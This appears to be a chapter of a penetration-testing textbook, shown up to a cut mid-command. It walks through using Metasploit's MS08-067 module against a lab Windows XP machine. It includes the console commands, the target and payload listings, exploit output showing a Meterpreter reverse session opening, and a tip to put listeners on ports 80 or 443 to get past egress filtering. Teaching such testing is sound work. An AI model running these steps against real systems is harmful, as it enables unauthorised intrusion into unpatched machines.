<html><head></head><body><section class="chapter" epub:type="chapter" id="using_the_metasploit_framework" title="Chapter&#xA0;4.&#xA0;Using the Metasploit Framework"><div class="titlepage"><div><div><h2 class="title">Chapter 4. Using the Metasploit Framework</h2></div></div></div><p><a class="indexterm" id="iddle2040"/>In subsequent chapters, we’ll take an in-depth look at the phases of penetration testing, but in this chapter, we’ll dive right in and get some hands-on experience with exploitation. Though the information-gathering and reconnaissance phases often have more bearing on a pentest’s success than exploitation does, it’s more fun to gather shells (a remote connection to an exploited target) or trick users into entering their company credentials into your cloned website.</p><p>In this chapter we’ll work with the Metasploit Framework, a tool that has become the de facto standard for penetration testers. First released in 2003, Metasploit has reached cult status in the security community. Though Metasploit is now owned by the security company Rapid7, an open source edition is still available, with development largely driven by the security community.</p><p><a class="indexterm" id="iddle1181"/><a class="indexterm" id="iddle1357"/><a class="indexterm" id="iddle1359"/><a class="indexterm" id="iddle1704"/><a class="indexterm" id="iddle1876"/><a class="indexterm" id="iddle1981"/><a class="indexterm" id="iddle2079"/><a class="indexterm" id="iddle2120"/>Metasploit’s modular and flexible architecture helps developers efficiently create working exploits as new vulnerabilities are discovered. As you’ll see, Metasploit is intuitive and easy to use, and it offers a centralized way to run trusted exploit code that has been vetted for accuracy by the security community.</p><p>Why use Metasploit? Say you’ve discovered a vulnerability in your client environment—the Windows XP system at 192.168.20.10 is missing Microsoft security bulletin MS08-067. As a penetration tester, it is up to you to exploit this vulnerability, if possible, and assess the risk of a compromise.</p><p>One approach might be to set up in your lab a Windows XP system that is also missing this patch, attempt to trigger the vulnerability, and develop a working exploit. But developing exploits by hand takes both time and skill, and the window of opportunity for your pentest may be closing.</p><p>You could instead search for code that exploits this vulnerability on the Internet. Sites like Packet Storm Security (<span class="emphasis"><em><a class="ulink" href="http://www.packetstormsecurity.com/" target="_top">http://www.packetstormsecurity.com/</a></em></span>), SecurityFocus (<span class="emphasis"><em><a class="ulink" href="http://www.securityfocus.com/" target="_top">http://www.securityfocus.com/</a></em></span>), and Exploit Database (<span class="emphasis"><em><a class="ulink" href="http://www.exploit-db.com/" target="_top">http://www.exploit-db.com/</a></em></span>) provide repositories of known exploit code. But be forewarned: Not all public exploit code does what it claims to do. Some exploit code may destroy the target system or even attack your system instead of the target. You should always be vigilant when running anything you find online and read through the code carefully before trusting it. Additionally, the public exploits you find may not meet your needs right out of the box. You may need to do some additional work to port them to your pentest environment.</p><p>Whether we develop an exploit from scratch or use a public one as a base, we will still need to get that exploit to work on your pentest. Our time will probably be better spent on tasks that are difficult to automate, and luckily, we can use Metasploit to make exploiting known vulnerabilities such as MS08-067 quick and painless.</p><div class="sect1" title="Starting Metasploit"><div class="titlepage"><div><div><h2 class="title" id="starting_metasploit" style="clear: both">Starting Metasploit</h2></div></div></div><p>Let’s start Metasploit and attack our first system. In Kali Linux, Meta sploit is in our path, so we can start it anywhere on the system. But before you start Metasploit, you will want to start the PostgreSQL database, which Metasploit will use to track what you do.</p><a id="pro_id00068"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>service postgresql start</strong></span></pre><p>Now you’re ready to start the Metasploit service. This command creates a PostgreSQL user called <span class="emphasis"><em>msf3</em></span> and a corresponding database to store our data. It also starts Metasploit’s remote procedure call (RPC) server and web server.</p><a id="pro_id00069"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>service metasploit start</strong></span></pre><p><a class="indexterm" id="iddle1474"/><a class="indexterm" id="iddle1687"/><a class="indexterm" id="iddle1699"/><a class="indexterm" id="iddle1758"/><a class="indexterm" id="iddle1762"/><a class="indexterm" id="iddle1764"/>There are multiple interfaces for using Metasploit. In this chapter we’ll use Msfconsole, the Metasploit text-based console, and Msfcli, the command line interface. Either interface can be used to run Metasploit modules, though I tend to spend most of my time in Msfconsole. Start the console by entering <span class="strong"><strong><code class="literal">msfconsole</code></strong></span>.</p><a id="pro_id00070"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfconsole</strong></span></pre><p>Don’t be alarmed if Msfconsole appears to hang for a minute or two; it’s loading the Metasploit module tree on the fly. Once it’s finished, you’ll be greeted by some clever ASCII art, a version listing and other details, and an <code class="literal">msf &gt;</code> prompt (see <a class="xref" href="ch04.xhtml#starting_msfconsole" title="Example 4-1. Starting Msfconsole">Example 4-1</a>).</p><div class="example"><a id="starting_msfconsole"/><div class="example-title">Example 4-1. Starting Msfconsole</div><div class="example-contents"><pre class="programlisting">     ,           ,&#13;
    /             \&#13;
   ((__---,,,---__))&#13;
      (_) O O (_)_________&#13;
         \ _ /            |\&#13;
          o_o \   M S F   | \&#13;
               \   _____  |  *&#13;
                |||   WW|||&#13;
                |||     |||&#13;
&#13;
&#13;
Large pentest? List, sort, group, tag and search your hosts and services&#13;
in Metasploit Pro -- type 'go_pro' to launch it now.&#13;
&#13;
       =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]&#13;
+ -- --=[ 1246 exploits - 678 auxiliary - 198 post&#13;
+ -- --=[ 324 payloads - 32 encoders - 8 nops&#13;
&#13;
msf &gt;</pre></div></div><p>Notice in <a class="xref" href="ch04.xhtml#starting_msfconsole" title="Example 4-1. Starting Msfconsole">Example 4-1</a> that, as of this writing, Metasploit had 1,246 exploits, 678 auxiliary modules, and so forth. No doubt by the time you read this, these numbers will be even larger. New modules are always being added to Metasploit, and because Metasploit is a community-driven project, anyone can submit modules for inclusion in the Metasploit Framework. (In fact, in <a class="xref" href="ch19.xhtml" title="Chapter 19. Fuzzing, Porting Exploits, and Metasploit Modules">Chapter 19</a>, you’ll learn how to write your own modules and gain immortality as a Metasploit author.)</p><p>If you’re ever stuck when using Msfconsole, enter <code class="literal">help</code> for a list of available commands and a description of what they do. For more detailed information about a specific command, including usage, enter <code class="literal">help</code> <span class="emphasis"><em><code class="literal">&lt;command name&gt;</code></em></span>.</p><p>For example, the help information for using Metasploit’s <code class="literal">route</code> command is shown in <a class="xref" href="ch04.xhtml#help_information_in_metasploit" title="Example 4-2. Help information in Metasploit">Example 4-2</a>.</p><div class="example"><a id="help_information_in_metasploit"/><div class="example-title">Example 4-2. Help information in Metasploit</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>help route</strong></span>&#13;
Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid]&#13;
&#13;
Route traffic destined to a given subnet through a supplied session.&#13;
The default comm is Local...</pre></div></div></div><div class="sect1" title="Finding Metasploit Modules"><div class="titlepage"><div><div><h2 class="title" id="finding_metasploit_modules" style="clear: both">Finding Metasploit Modules</h2></div></div></div><p><a class="indexterm" id="iddle1199"/><a class="indexterm" id="iddle1691"/><a class="indexterm" id="iddle1692"/><a class="indexterm" id="iddle1693"/>Let’s look at how we might use Metasploit to exploit an unpatched vulnerability in our Windows XP target. We will exploit the vulnerability patched in Microsoft Security Bulletin MS08-067. A natural question you may have is, how do we know this patch is missing on our Windows XP target? In subsequent chapters, we will walk through the steps of discovering this vulnerability as well as several others on our target systems. For now, just trust me that this is the vulnerability we would like to exploit.</p><p>MS08-067 patched an issue in the <span class="emphasis"><em>netapi32.dll</em></span> that could allow attackers to use a specially crafted remote procedure call request via the Server Message Block (SMB) service to take over a target system. This vulnerability is particularly dangerous because it does not require an attacker to authenticate to the target machine before running the attack. MS08-067 gained eternal infamy as the vulnerability exploited by the Conficker worm, which was widely reported in the media.</p><p>Now, if you’re familiar with Microsoft patches, you may recognize that this one is from 2008. Considering its age, you may be surprised to learn how often the vulnerability it patched can still lead to success in penetration testing, even today, particularly when assessing internal networks. Metasploit’s MS08-067 module is simple to use and has a high success rate, making it an ideal first example. Our first step in using Metasploit is to find a module that exploits this particular vulnerability. We have a few options. Usually, a simple Google search will find what you need, but Metasploit also has an online database of modules (<span class="emphasis"><em><a class="ulink" href="http://www.rapid7.com/db/modules/" target="_top">http://www.rapid7.com/db/modules/</a></em></span>) and a built-in search function that you can use to search for the correct modules.</p><div class="sect2" title="The Module Database"><div class="titlepage"><div><div><h3 class="title" id="module_database">The Module Database</h3></div></div></div><p>You can use the Metasploit search page to match Metasploit modules to -vulnerabilities by Common Vulnerabilities and Exposures (CVE) number, Open Sourced Vulnerability Database (OSVDB) ID, Bugtraq ID, or Microsoft Security Bulletin, or you can search the full text of the module information for a string. Search for <span class="emphasis"><em>MS08-067</em></span> in the Microsoft Security Bulletin ID field, as shown in <a class="xref" href="ch04.xhtml#searching_the_metasploit_auxiliary_modul" title="Figure 4-1. Searching the Metasploit Auxiliary Module &amp; Exploit Database">Figure 4-1</a>.</p><div class="figure"><a id="searching_the_metasploit_auxiliary_modul"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00056"/><img alt="Searching the Metasploit Auxiliary Module &amp; Exploit Database" src="httpatomoreillycomsourcenostarchimages2030302.png.jpg"/></div></div><div class="figure-title">Figure 4-1. Searching the Metasploit Auxiliary Module &amp; Exploit Database</div></div><p><a class="indexterm" id="iddle1684"/><a class="indexterm" id="iddle1703"/><a class="indexterm" id="iddle2113"/>The results of the search, shown in <a class="xref" href="ch04.xhtml#ms08-067_metasploit_module_page" title="Figure 4-2. MS08-067 Metasploit module page">Figure 4-2</a>, tell us the module name we need as well as information about the module (which we’ll discuss in the next section).</p><div class="figure"><a id="ms08-067_metasploit_module_page"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00057"/><img alt="MS08-067 Metasploit module page" src="httpatomoreillycomsourcenostarchimages2030304.png.jpg"/></div></div><div class="figure-title">Figure 4-2. MS08-067 Metasploit module page</div></div><p>The full name of the Metasploit module for the MS08-067 security bulletin is shown in the URI bar. In the modules directory of Metasploit, this exploit is <span class="emphasis"><em>exploit/windows/smb/ms08_067_netapi</em></span>.</p></div><div class="sect2" title="Built-In Search"><div class="titlepage"><div><div><h3 class="title" id="built-in_search">Built-In Search</h3></div></div></div><p>You can also use Metasploit’s built-in search function to find the correct module name, as shown in <a class="xref" href="ch04.xhtml#searching_for_a_metasploit_module" title="Example 4-3. Searching for a Metasploit module">Example 4-3</a>.</p><div class="example"><a id="searching_for_a_metasploit_module"/><div class="example-title">Example 4-3. Searching for a Metasploit module</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>search ms08-067</strong></span>&#13;
&#13;
Matching Modules&#13;
================&#13;
&#13;
   Name                                 Disclosure Date          Rank   Description&#13;
   ----                                 ---------------          ----   -----------&#13;
   <span class="strong"><strong>exploit/windows/smb/ms08_067_netapi</strong></span>  2008-10-28 00:00:00 UTC  great  Microsoft Server&#13;
                                                                          Service Relative Path&#13;
                                                                          Stack Corruption</pre></div></div><p><a class="indexterm" id="iddle1506"/>Again we find that the correct module name for this vulnerability is <span class="emphasis"><em>exploit/windows/smb/ms08_067_netapi</em></span>. Once you’ve identified a module to use, enter the <code class="literal">info</code> command with the module name, as shown in <a class="xref" href="ch04.xhtml#information_listing_in_metasploit" title="Example 4-4. Information listing in Metasploit">Example 4-4</a>.</p><div class="example"><a id="information_listing_in_metasploit"/><div class="example-title">Example 4-4. Information listing in Metasploit</div><div class="example-contents"><pre class="programlisting">  msf &gt; <span class="strong"><strong>info exploit/windows/smb/ms08_067_netapi</strong></span>&#13;
&#13;
        ❶Name: Microsoft Server Service Relative Path Stack Corruption&#13;
      ❷Module: exploit/windows/smb/ms08_067_netapi&#13;
      Version: 0&#13;
    ❸Platform: Windows&#13;
  ❹Privileged: Yes&#13;
      License: Metasploit Framework License (BSD)&#13;
        ❺Rank: Great&#13;
&#13;
❻ Available targets:&#13;
    Id  Name&#13;
    --  ----&#13;
    0   Automatic Targeting&#13;
    1   Windows 2000 Universal&#13;
    2   Windows XP SP0/SP1 Universal&#13;
    --<span class="emphasis"><em>snip</em></span>--&#13;
    67  Windows 2003 SP2 Spanish (NX)&#13;
&#13;
  ❼ Basic options:&#13;
    Name     Current Setting  Required  Description&#13;
    ----     ---------------  --------  -----------&#13;
    RHOST                     yes       The target address&#13;
    RPORT    445              yes       Set the SMB service port&#13;
    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)&#13;
&#13;
❽ Payload information:&#13;
    Space: 400&#13;
    Avoid: 8 characters&#13;
❾ Description:&#13;
    This module exploits a parsing flaw in the path canonicalization&#13;
    code of NetAPI32.dll through the Server Service. This module is&#13;
    capable of bypassing NX on some operating systems and service packs.&#13;
    The correct target must be used to prevent the Server Service (along&#13;
    with a dozen others in the same process) from crashing. Windows XP&#13;
    targets seem to handle multiple successful exploitation events, but&#13;
    2003 targets will often crash or hang on subsequent attempts. This&#13;
    is just the first version of this module, full support for NX bypass&#13;
    on 2003, along with other platforms, is still in development.&#13;
❿ References:&#13;
    http://www.microsoft.com/technet/security/bulletin/MS08-067.mspx</pre></div></div><p>This info page tells us a lot.</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>First we see some basic information about the module, including a descriptive name at ❶ followed by the module name at ❷. (The version field formerly denoted the SVN revision for the module, but now that Metasploit is hosted on GitHub, all modules are set to version 0.)</p></li><li class="listitem"><p><span class="strong"><strong><code class="literal">Platform</code></strong></span> ❸ tells us that this exploit is for Windows systems.</p></li><li class="listitem"><p><span class="strong"><strong><code class="literal">Privileged</code></strong></span> ❹ tells us whether this module requires or grants high privileges on the target. The <code class="literal">License</code> is set to Metasploit Framework License (BSD). (Metasploit’s license is a three-clause BSD open source license.)</p></li><li class="listitem"><p><span class="strong"><strong><code class="literal">Rank</code></strong></span> ❺ lists the exploit’s potential impact on the target. Exploits are ranked from manual to excellent. An exploit ranked excellent should never crash a service; memory-corruption vulnerabilities such as MS08-067 are usually not in this category. Our module is in the great category, one step down. A great exploit can automatically detect the correct target and has other features that make it more likely to succeed.</p></li><li class="listitem"><p><span class="strong"><strong><code class="literal">Available targets</code></strong></span> ❻ lists operating system versions and patch levels that the module can exploit. This module has 67 possible targets, including Windows 2000, Windows 2003, and Windows XP, as well as multiple service and language packs.</p></li><li class="listitem"><p><span class="strong"><strong><code class="literal">Basic options</code></strong></span> ❼ lists various options for the module that can be set to make a module better meet our needs. For example, the <code class="literal">RHOST</code> option tells Metasploit the IP address of the target. (We’ll discuss the basic options in depth in <a class="xref" href="ch04.xhtml#setting_module_options" title="Setting Module Options">Setting Module Options</a>.)</p></li><li class="listitem"><p><span class="strong"><strong><code class="literal">Payload information</code></strong></span> ❽ contains information to help Metasploit decide which payloads it can use with this exploit. Payloads, or shellcode, tell the exploited system what to do on behalf of the attacker. (The goal of attacking a target is, of course, to get it to do something on our behalf that it isn’t supposed to do.) Metasploit’s payload system gives us many options for what to make the target do.</p></li><li class="listitem"><p><span class="strong"><strong><code class="literal">Description</code></strong></span> ❾ includes more details about the particular vulnerability that the module exploits.</p></li><li class="listitem"><p><span class="strong"><strong><code class="literal">References</code></strong></span> ❿ contains a link to online vulnerability database entries. If you’re ever in doubt about which Metasploit module to use for a vulnerability, start with its info page.</p></li></ul></div><p><a class="indexterm" id="iddle1696"/><a class="indexterm" id="iddle2077"/><a class="indexterm" id="iddle2152"/>Having confirmed that this is the right module, tell Metasploit to use this module with the command <span class="strong"><strong><code class="literal">use windows/smb/ms08_067_netapi</code></strong></span>. You can drop the <span class="emphasis"><em>exploit/</em></span> part of the exploit name; Metasploit will figure out what you want.</p><a id="pro_id00071"/><pre class="programlisting">msf &gt; <span class="strong"><strong>use windows/smb/ms08_067_netapi</strong></span>&#13;
msf  exploit(ms08_067_netapi) &gt;</pre><p>Now we’re in the context of the exploit module.</p></div></div><div class="sect1" title="Setting Module Options"><div class="titlepage"><div><div><h2 class="title" id="setting_module_options" style="clear: both">Setting Module Options</h2></div></div></div><p>Having chosen our exploit, we need to give Metasploit some information. As you’ll see throughout this book, Metasploit can aid you in many aspects of penetration testing, but it isn’t a mind reader . . . yet. To see the information Metasploit needs from you to run your chosen module, enter <span class="strong"><strong><code class="literal">show options</code></strong></span> (<a class="xref" href="ch04.xhtml#exploit_module_options" title="Example 4-5. Exploit module options">Example 4-5</a>).</p><div class="example"><a id="exploit_module_options"/><div class="example-title">Example 4-5. Exploit module options</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/windows/smb/ms08_067_netapi):&#13;
&#13;
   Name     Current Setting  Required  Description&#13;
   ----     ---------------  --------  -----------&#13;
  ❶RHOST                     yes       The target address&#13;
  ❷RPORT    445              yes       Set the SMB service port&#13;
  ❸SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)&#13;
&#13;
Exploit target:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
  ❹0   Automatic Targeting&#13;
&#13;
&#13;
msf  exploit(ms08_067_netapi) &gt;</pre></div></div><p>At the top of the output shown in <a class="xref" href="ch04.xhtml#exploit_module_options" title="Example 4-5. Exploit module options">Example 4-5</a> are the module settings and any default values, whether certain settings are required for the module to run successfully, and a description of each setting.</p><div class="sect2" title="RHOST"><div class="titlepage"><div><div><h3 class="title" id="rhost">RHOST</h3></div></div></div><p>The <code class="literal">RHOST</code> option ❶ refers to the remote host we want to exploit. This option is required because it gives Metasploit a target to attack. We’ll tell Metasploit to exploit the Windows XP target machine that we set up in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a> by changing the <code class="literal">RHOST</code> option from blank to our target IP address. (If you can’t remember what that is, on the Windows XP machine <a class="indexterm" id="iddle1361"/><a class="indexterm" id="iddle1962"/><a class="indexterm" id="iddle2091"/><a class="indexterm" id="iddle2159"/><a class="indexterm" id="iddle2182"/>run <code class="literal">ipconfig</code> at the command line to find out.) To set an option enter <code class="literal">set</code> <span class="emphasis"><em><code class="literal">&lt;option to set&gt; &lt;value to set it to&gt;</code></em></span>, so in this case, <span class="strong"><strong><code class="literal">set RHOST 192.168.20.10</code></strong></span>. (Remember to use your own Windows XP target’s IP address.) After issuing this command, running <code class="literal">show options</code> again should show that the value of <code class="literal">RHOST</code> is set to 192.168.20.10.</p></div><div class="sect2" title="RPORT"><div class="titlepage"><div><div><h3 class="title" id="rport">RPORT</h3></div></div></div><p><code class="literal">RPORT</code> ❷ refers to the remote port to attack. I remember a former manager of mine who spent a good amount of time looking for port 80—as in trying to locate it physically. Unsatisfied with my explanation that networking sockets are made entirely of code, I eventually just pointed at the Ethernet port. The moral of this story is this: A port is just a network socket; it’s not a physical port. For example, when you browse to <span class="emphasis"><em><a class="ulink" href="http://www.google.com" target="_top">www.google.com</a></em></span>, a web server somewhere on the Internet is listening on port 80.</p><p>In this case we see that <code class="literal">RPORT</code> is set to a default value. Because our exploit uses the Windows SMB service, the <code class="literal">RPORT</code> value should probably be 445, the default port for SMB. And, as you can see, Metasploit saves us the trouble of having to set the value by setting the default to 445 (which you can change if you need to). In our case, we can just leave it alone.</p></div><div class="sect2" title="SMBPIPE"><div class="titlepage"><div><div><h3 class="title" id="smbpipe">SMBPIPE</h3></div></div></div><p>Like the <code class="literal">RPORT</code> value, keep the default for the <code class="literal">SMBPIPE</code> option ❸ as <code class="literal">BROWSER</code>. This will work just fine for our purposes. (SMB pipes allow us to talk to Windows interprocess communication over a network. We’ll look at finding out which SMB pipes are listening on our target machines later in this chapter.)</p></div><div class="sect2" title="Exploit Target"><div class="titlepage"><div><div><h3 class="title" id="exploit_target">Exploit Target</h3></div></div></div><p>The Exploit Target is set to <code class="literal">0 Automatic Targeting</code> ❹. This is the target operating system and version. You can view the available targets on the module’s info page or just show them with the command <code class="literal">show targets</code> (<a class="xref" href="ch04.xhtml#exploit_targets" title="Example 4-6. Exploit targets">Example 4-6</a>).</p><div class="example"><a id="exploit_targets"/><div class="example-title">Example 4-6. Exploit targets</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>show targets</strong></span>&#13;
&#13;
Exploit targets:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
   0   Automatic Targeting&#13;
   1   Windows 2000 Universal&#13;
   2   Windows XP SP0/SP1 Universal&#13;
   3   Windows XP SP2 English (AlwaysOn NX)&#13;
   4   Windows XP SP2 English (NX)&#13;
   5   Windows XP SP3 English (AlwaysOn NX)&#13;
   <span class="emphasis"><em>--snip--</em></span>&#13;
   67  Windows 2003 SP2 Spanish (NX)</pre></div></div><p><a class="indexterm" id="iddle1408"/><a class="indexterm" id="iddle1700"/><a class="indexterm" id="iddle2153"/><a class="indexterm" id="iddle2155"/>As you can see in <a class="xref" href="ch04.xhtml#exploit_targets" title="Example 4-6. Exploit targets">Example 4-6</a>, this module can attack Windows 2000, Windows 2003, and Windows XP.</p><div class="note" title="Note"><h3 class="title"><a id="ch04note01"/>Note</h3><p>Remember, Microsoft has released patches for all the platforms affected by this bug, but keeping all systems in an environment up-to-date with Windows patches is easier said than done. Many of your pentesting clients will be missing some critical updates in Windows and other software.</p></div><p>We know that our target is running Windows XP SP3 English, so we can wager that the correct target number is either 5 or 6, but it won’t always be so easy. Choose <code class="literal">Automatic Targeting</code> to tell Metasploit to fingerprint the SMB service and choose the appropriate target based on the results.</p><p>To set a target option, enter <code class="literal">set target</code> <span class="emphasis"><em><code class="literal">&lt;target number&gt;</code></em></span>. In this case we’ll leave the module target at the default <code class="literal">Automatic Targeting</code> and move on.</p></div></div><div class="sect1" title="Payloads (or Shellcode)"><div class="titlepage"><div><div><h2 class="title" id="payloads_left_parenthesisor_shellcoderig" style="clear: both">Payloads (or Shellcode)</h2></div></div></div><p>Based on the output of <code class="literal">show options</code> command, it looks like everything should be ready to go at this point, but we’re not quite done yet. We’ve forgotten to tell our exploit what to do once the target has been exploited. One of the ways that Metasploit makes things easier is by setting up our payloads for us. Metasploit has a plethora of payloads, ranging from simple Windows commands to the extensible Metasploit Meterpreter (see <a class="xref" href="ch13.xhtml" title="Chapter 13. Post Exploitation">Chapter 13</a> for more detailed information on Meterpreter). Just select a compatible payload, and Metasploit will craft your exploit string, including the code to trigger the vulnerability and the payload to run after exploitation is successful. (We’ll look at writing exploits by hand in <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a> through <a class="xref" href="ch19.xhtml" title="Chapter 19. Fuzzing, Porting Exploits, and Metasploit Modules">Chapter 19</a>.)</p><div class="sect2" title="Finding Compatible Payloads"><div class="titlepage"><div><div><h3 class="title" id="finding_compatible_payloads">Finding Compatible Payloads</h3></div></div></div><p>As of this writing there were 324 payloads in Metasploit, and like exploit modules, new payloads are added to the Framework regularly. For instance, as mobile platforms take over the world, payloads for iOS and other smartphones are starting to show up in Metasploit. But, of course, not all 324 payloads are compatible with our chosen exploit. Our Windows system will be a bit confused if it receives instructions that are meant for an iPhone. To see compatible payloads, enter <span class="strong"><strong><code class="literal">show payloads</code></strong></span>, as shown in <a class="xref" href="ch04.xhtml#compatible_payloads" title="Example 4-7. Compatible payloads">Example 4-7</a>.</p><div class="example"><a id="compatible_payloads"/><div class="example-title">Example 4-7. Compatible payloads</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>show payloads</strong></span>&#13;
&#13;
Compatible Payloads&#13;
===================&#13;
&#13;
   Name                                Disclosure Date  Rank    Description&#13;
   ----                                ---------------  ----    -----------&#13;
   generic/custom                                       normal  Custom Payload&#13;
   generic/debug_trap                                   normal  Generic x86 Debug Trap&#13;
   generic/shell_bind_tcp                               normal  Generic Command Shell, Bind TCP&#13;
                                                                  Inline&#13;
   generic/shell_reverse_tcp                            normal  Generic Command Shell, Reverse&#13;
                                                                  Inline&#13;
   generic/tight_loop                                   normal  Generic x86 Tight Loop&#13;
   windows/dllinject/bind_ipv6_tcp                      normal  Reflective DLL Injection, Bind&#13;
                                                                  TCP Stager (IPv6)&#13;
   windows/dllinject/bind_nonx_tcp                      normal  Reflective DLL Injection, Bind&#13;
                                                                  TCP Stager (No NX or Win7)&#13;
   windows/dllinject/bind_tcp                           normal  Reflective DLL Injection, Bind&#13;
                                                                  TCP Stager&#13;
   windows/dllinject/reverse_http                       normal  Reflective DLL Injection, Reverse&#13;
                                                                  HTTP Stager&#13;
<span class="emphasis"><em>--snip--</em></span>&#13;
   windows/vncinject/reverse_ipv6_http                  normal  VNC Server (Reflective Injection),&#13;
                                                                  Reverse HTTP Stager (IPv6)&#13;
   windows/vncinject/reverse_ipv6_tcp                   normal  VNC Server (Reflective Injection),&#13;
                                                                  Reverse TCP Stager (IPv6)&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
   windows/vncinject/reverse_tcp                        normal  VNC Server (Reflective Injection),&#13;
                                                                  Reverse TCP Stager&#13;
   windows/vncinject/reverse_tcp_allports               normal  VNC Server (Reflective Injection),&#13;
                                                                  Reverse All-Port TCP Stager&#13;
   windows/vncinject/reverse_tcp_dns                    normal  VNC Server (Reflective Injection),&#13;
                                                                  Reverse TCP Stager (DNS)</pre></div></div><p><a class="indexterm" id="iddle1256"/><a class="indexterm" id="iddle1358"/><a class="indexterm" id="iddle1706"/>If you forget to set a payload, you may find that, miraculously, the exploit module will just choose the default payload and associated settings and run it anyway. Still, you should get in the habit of manually setting a payload and its options because the default won’t always fit your needs.</p></div><div class="sect2" title="A Test Run"><div class="titlepage"><div><div><h3 class="title" id="test_run">A Test Run</h3></div></div></div><p>Let’s keep things simple and send off our exploit with the default payload options first, just to see how things work. Enter <span class="strong"><strong><code class="literal">exploit</code></strong></span> to tell Metasploit to run the module, as shown in <a class="xref" href="ch04.xhtml#running_the_exploit" title="Example 4-8. Running the exploit">Example 4-8</a>.</p><div class="example"><a id="running_the_exploit"/><div class="example-title">Example 4-8. Running the exploit</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] Automatically detecting the target...&#13;
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English&#13;
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)&#13;
[*] Attempting to trigger the vulnerability...&#13;
[*] Sending stage (752128 bytes) to 192.168.20.10&#13;
[*] Meterpreter session 1 opened (192.168.20.9:4444 -&gt; 192.168.20.10:1334) at&#13;
2015-08-31 07:37:05 -0400&#13;
&#13;
meterpreter &gt;</pre></div></div><p><a class="indexterm" id="iddle1110"/><a class="indexterm" id="iddle1715"/><a class="indexterm" id="iddle1952"/><a class="indexterm" id="iddle2074"/><a class="indexterm" id="iddle2148"/>As you can see, we end up with a Meterpreter session. Meterpreter is short for <span class="emphasis"><em>meta-interpreter</em></span>, Metasploit’s unique payload. I often describe it as a shell on steroids. It can do everything a command shell can do and much, much more. We’ll cover Meterpreter in depth in <a class="xref" href="ch13.xhtml" title="Chapter 13. Post Exploitation">Chapter 13</a>, but to get a head start, enter <span class="strong"><strong><code class="literal">help</code></strong></span> in the Meterpreter console for a list of Meterpreter’s commands.</p><div class="note" title="Note"><h3 class="title"><a id="ch04note02"/>Note</h3><p>Another thing to note about the default options is that Metasploit uses the port 4444. In our lab there is nothing wrong with this. It will work just fine. However, on real engagements, if your client is using even primitive intrusion-prevention software, it may take note of traffic on port 4444 and say, “Hey, you are Metasploit, go away!” and drop your connection.</p></div><p>For now, let’s close our Meterpreter session and learn more about selecting payloads manually. As useful as Meterpreter is, you may find yourself in situations where it is not the ideal payload to meet your needs. Type <span class="strong"><strong><code class="literal">exit</code></strong></span> into your Meterpreter prompt to return to the regular Metasploit console.</p><a id="pro_id00072"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>exit</strong></span>&#13;
[*] Shutting down Meterpreter...&#13;
&#13;
[*] Meterpreter session 1 closed.  Reason: User exit&#13;
msf  exploit(ms08_067_netapi) &gt;</pre></div></div><div class="sect1" title="Types of Shells"><div class="titlepage"><div><div><h2 class="title" id="types_of_shells" style="clear: both">Types of Shells</h2></div></div></div><p>In the list of compatible payloads shown in <a class="xref" href="ch04.xhtml#compatible_payloads" title="Example 4-7. Compatible payloads">Example 4-7</a>, you see a range of options including command shells, Meterpreter, a speech API, or execution of a single Windows command. Meterpreter or otherwise, shells fall into two categories: bind and reverse.</p><div class="sect2" title="Bind Shells"><div class="titlepage"><div><div><h3 class="title" id="bind_shells">Bind Shells</h3></div></div></div><p>A <span class="emphasis"><em>bind shell</em></span> instructs the target machine to open a command shell and listen on a local port. The attack machine then connects to the target machine on the listening port. However, with the advent of firewalls, the effectiveness of bind shells has fallen because any correctly configured firewall will block traffic to some random port like 4444.</p></div><div class="sect2" title="Reverse Shells"><div class="titlepage"><div><div><h3 class="title" id="reverse_shells">Reverse Shells</h3></div></div></div><p>A <span class="emphasis"><em>reverse shell</em></span>, on the other hand, actively pushes a connection back to the attack machine rather than waiting for an incoming connection. In this case, on our attack machine we open a local port and listen for a connection from our target because this reverse connection is more likely to make it through a firewall.</p><div class="note" title="Note"><h3 class="title"><a id="ch04note03"/>Note</h3><p><a class="indexterm" id="iddle1612"/><a class="indexterm" id="iddle1918"/><a class="indexterm" id="iddle2138"/><a class="indexterm" id="iddle2154"/>You may be thinking, “Was this book written in 2002 or something? My firewall has egress filtering.” Modern firewalls allow you to stop outbound connections as well as inbound ones. It would be trivial to stop a host in your environment from connecting out, for instance, to port 4444. But say I set up my listener on port 80 or port 443. To a firewall, that will look like web traffic, and you know you have to let your users look at Facebook from their workstations or there would be mutiny and pandemonium on all sides.</p></div></div></div><div class="sect1" title="Setting a Payload Manually"><div class="titlepage"><div><div><h2 class="title" id="setting_a_payload_manually" style="clear: both">Setting a Payload Manually</h2></div></div></div><p>Let’s select a Windows reverse shell for our payload. Set a payload the same way you set the <code class="literal">RHOST</code> option: <code class="literal">set payload</code> <span class="emphasis"><em><code class="literal">&lt;payload to use&gt;</code></em></span>.</p><a id="pro_id00073"/><pre class="programlisting">msf  exploit(ms08_067_netapi) 